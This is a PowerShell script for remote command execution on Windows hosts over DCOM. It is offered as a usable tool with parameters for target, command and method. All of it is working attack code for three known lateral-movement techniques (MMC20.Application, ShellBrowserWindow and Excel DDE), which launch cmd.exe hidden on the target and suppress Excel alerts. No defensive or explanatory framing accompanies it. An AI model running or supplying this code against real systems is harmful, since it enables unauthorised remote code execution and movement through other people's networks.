# DCOM Command Execution Script
# Use this to execute commands on remote Windows systems via DCOM
# Requires valid credentials with appropriate permissions

param(
    [string]$TargetComputer,
    [string]$Command,
    [string]$Method = "MMC20",  # MMC20, ShellBrowser, ExcelDDE
    [switch]$Verbose
)

if (-not $TargetComputer -or -not $Command) {
    Write-Host "Usage: .\dcom-execute.ps1 -TargetComputer <IP> -Command <CMD> -Method <MMC20|ShellBrowser|ExcelDDE>" -ForegroundColor Yellow
    exit 1
}

Write-Host "[*] Executing command on $TargetComputer via $Method" -ForegroundColor Cyan
Write-Host "[*] Command: $Command" -ForegroundColor Cyan

try {
    switch ($Method) {
        "MMC20" {
            Write-Host "[+] Using MMC20.Application..." -ForegroundColor Green
            $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", $TargetComputer))
            $com.Document.ActiveView.ExecuteShellCommand("cmd.exe", "/c $Command", $null, "7")
            Write-Host "[+] Command executed successfully" -ForegroundColor Green
        }
        
        "ShellBrowser" {
            Write-Host "[+] Using ShellBrowserWindow..." -ForegroundColor Green
            $clsid = "{C08AFD90-F2A1-11D1-8455-00A0C91F3880}"
            $com = [Type]::GetTypeFromCLSID($clsid, $TargetComputer)
            $obj = [System.Activator]::CreateInstance($com)
            $item = $obj.Item()
            $item.Document.Application.ShellExecute("cmd.exe", "/c $Command", $null, $null, 0)
            Write-Host "[+] Command executed successfully" -ForegroundColor Green
        }
        
        "ExcelDDE" {
            Write-Host "[+] Using Excel DDE..." -ForegroundColor Green
            $Com = [Type]::GetTypeFromProgID("Excel.Application", $TargetComputer)
            $Obj = [System.Activator]::CreateInstance($Com)
            $Obj.DisplayAlerts = $false
            $Obj.DDEInitiate("cmd", "/c $Command")
            Write-Host "[+] Command executed successfully" -ForegroundColor Green
        }
        
        default {
            Write-Host "[-] Unknown method: $Method" -ForegroundColor Red
            Write-Host "[+] Available methods: MMC20, ShellBrowser, ExcelDDE" -ForegroundColor Yellow
            exit 1
        }
    }
    
} catch {
    Write-Host "[-] Error: $_" -ForegroundColor Red
    exit 1
}

Write-Host "[*] Execution complete" -ForegroundColor Cyan
